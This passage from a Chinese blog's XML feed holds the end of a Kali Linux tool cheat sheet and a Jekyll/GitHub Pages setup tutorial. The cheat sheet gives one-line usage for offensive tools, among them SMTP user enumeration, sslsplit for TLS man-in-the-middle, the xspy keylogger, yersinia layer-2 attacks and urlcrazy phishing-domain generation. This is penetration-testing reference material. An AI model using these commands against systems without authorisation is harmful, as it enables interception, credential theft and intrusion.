SMTP用户枚举是一个工具，用于枚举操作系统级别的用户帐户在Solaris通过SMTP服务（邮件）。用法：1$ smtp-user-enum -M VRFY -u root -t 192.168.1.25 snmpcheck描述: SNMP枚举工具。用法：1$ snmpcheck -t 192.168.1.2 -c public sslcaudit描述: 实用的自动化测试的SSL / TLS的客户端来抵抗中间人攻击。用法：1$ caudit -l 0.0.0.0:443 -v 1 SSLsplit描述: 中间人攻击，将https协议强制替换为http。。用法：1$ sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 SSLyze描述: 是一款使用Python实现的SSL扫描工具，它可以扫描出SSL中一些经典的配置错误。用法：1$ sslyze --regular www.example.com theharvester描述: 邮箱挖掘器。用法：1$ theharvester -d kali.org -l 500 -b google tlssled描述: TLSSLed是一个Linux bash脚本,它的功能是测试目标SSL/TLS(HTTPS)WEB 服务器的安全性。TLSSLed基于sslscan，功能包括：测试目标是否支持SSLv2协议、NULL cipher等等。用法：1$ tlssled 192.168.1.1 443 tshark描述: 可以直接过滤数据包导出用法：1$ tshark -f "tcp port 80" -i eth0 urlcrazy描述: 钓鱼域名。用法：1$ urlcrazy -k dvorak -r example.com whatweb描述: WhatWeb是一款网站指纹识别工具，主要针对的问题是：“这个网站使用的什么技术？”WhatWeb可以告诉你网站搭建使用的程序，包括何种CMS系统、什么博客系统、Javascript库、web服务器、内嵌设备等。WhatWeb有超过900个插件，并且可以识别版本号、email地址、账号、web框架、SQL错误等等。用法：1$ whatweb www.example.com Wireshark描述: 流量分析。用法：1$ wireshark xspy描述: 键盘记录器用法：1$ xspy yersinia描述: 是国外的一款专门针对交换机执行第二层攻击的一个攻击工具。用法：1$ yersinia -G zaproxy描述: 一个易于使用交互式的用于web应用程序漏洞挖掘的渗透测试工具。用法：1$ zaproxy]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>kali</tag>
        <tag>information gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github + Markdown + Jekyll 搭建博客]]></title>
    <url>%2F2016%2F07%2F04%2Fgithub-markdown-jekyll%2F</url>
    <content type="text"><![CDATA[概述Github + Markdown + Jekyll 搭建博客的步骤如下，不过首先得注册Github账号，以及创建一个Repository,命名格式为：username.github.io（username 必须和账号一致。）这样就生成了属于你的Github下的网页,其中过程可以参照GitHub Pages。 安装安装Kekyll需要以下环境： Ruby2.0以上 RubyGems Linux,Unix,Mac OS 安装Ruby2.012$ sudo apt-get install ruby2.0 $ sudo apt-get install ruby2.0-dev 由于我的Ubuntu 14.04默认的Ruby是1.9.3，而Ruby 2.0则需要用命令ruby2.0运行，程序前必须设定好运行版本，不然会运行错误。于是我强制替换了/usr/bin目录下与Ruby相关的符号链接到Ruby 2.0对应的版本，进行了如下步骤： 12345678$ cd /usr/bin/ $ ln -sf ruby2.0 ruby $ ln -sf gem2.0 gem $ ln -sf erb2.0 erb $ ln -sf irb2.0 irb $ ln -sf rake2.0 rake $ ln -sf rdoc2.0 rdoc $ ln -sf testrb2.0 testrb 替换完后还要更新下gem： 12$ gem update \-\-system $ gem pristine \-\-all 这时Ruby的默认版本就已经切换到Ruby 2.0了。当然虽然这样做比较暴力，但也是可以还原的，如果想切换会Ruby 1.9.3，只需要运行（请注意在Ubuntu 14.04中，Ruby 1.9.3的名称为ruby1.9.1）,这里另外附上还原Ruby 1.9.3的方法： 12345678910$ cd /usr/bin/ $ ln -sf ruby1.9.1 ruby $ ln -sf gem1.9.1 gem $ ln -sf erb1.9.1 erb $ ln -sf irb1.9.1 irb $ ln -sf rake1.9.1 rake $ ln -sf rdoc1.9.1 rdoc $ ln -sf testrb1.9.1 testrb $ gem update \-\-system $ gem pristine \-\-all 安装Jekyll12$ gem install jekyll $ gem install bundler 安装模板解释器RDiscount默认模板是Maruku，这里替换为RDiscount。Maruku是纯ruby写的Markdown模板解释器。RDiscount是C写的模板解释器，重点是它的效率比Maruku快很多。 1$ gem install rdiscount 新建一个Jekyll目录1$ jekyll new blogname 然后bundle12$ bundle update $ bundle install 启动server因为Jekyll自带一个服务器，所以可以直接运行服务。只不过它默认是只能本机访问4000端口（使用--host 服务器IP参数，可允许外部IP访问），而且并不是后台运行（可用--detach后台运行）。 1$ jekyll serve \-\-host 自己外网IP \-\-detach OK！ 可以用浏览器访问这个服务器http://IP:4000。关闭后台程序： 1$ kill -9 pid 修改配置1$ vim _config.yml 修改里面的url为username.github.io（username是你的github账户名） 上传github1234$ git init $ git add \-\-all $ git commit -m "博客" $ git push origin maste 过一会就可已访问username.github.io（username是你的github账户名）了 Jekyll主题接下来再说说jeykll的目录结构。Jekyll的核心其实是一个文本转换引擎。它的概念其实就是：你用你最喜欢的标记语言来写文章，可以是Markdown,也可以是 Textile, 或者就是简单的 HTML, 然后 Jekyll 就会帮你套入一个或一系列的布局中。在整个过程中你可以设置 URL 路径，你的文本在布局中的显示样式等等。这些都可以通过纯文本编辑来实现，最终生成的静态页面就是你的成果。 至于Jekyll的主题，你可以参照jekyllthemes。找到合适的主题之后，只要修改_config.yml即可，然后就是再_posts里写文章了，文章的命名格式为YYYY-MM-DD-name-of-post.md。而Markdown的语法可以参照Markdown语法,至于Markdown的编辑器，最好不要用vim，去下个专门的编辑器。]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>jekyll</tag>
        <tag>github</tag>
        <tag>blog</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
</search>
